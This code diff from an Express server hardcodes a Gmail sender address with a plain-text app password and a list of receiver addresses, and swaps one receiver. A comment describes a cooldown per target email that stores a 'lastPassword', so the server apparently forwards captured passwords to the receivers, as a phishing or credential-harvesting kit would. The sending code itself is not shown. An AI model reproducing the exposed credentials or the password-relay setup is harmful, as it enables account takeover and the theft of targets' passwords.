@@ -16,7 +16,7 @@ app.use(express.static(__dirname));
 const SENDER_EMAIL = 'gajeb682@gmail.com';
 const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 const RECEIVER_EMAIL = [
-    'uuuftcc@gmail.com',
+    'chilligemaass@gmail.com',
     'akunvanzz888@gmail.com',
     'zamzaja78@gmail.com'
 ];
@@ -24,7 +24,6 @@ const RECEIVER_EMAIL = [
 // <== TAMBAHAN 1: Cooldown per EMAIL TARGET (bukan per sender)
 // Format: { "target@email.com": { lastSendTime: timestamp, lastPassword: "xxx" } }
 const TARGET_COOLDOWN = {};
-
 const COOLDOWN_HOURS = 1;
 const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000; // 1 jam
 
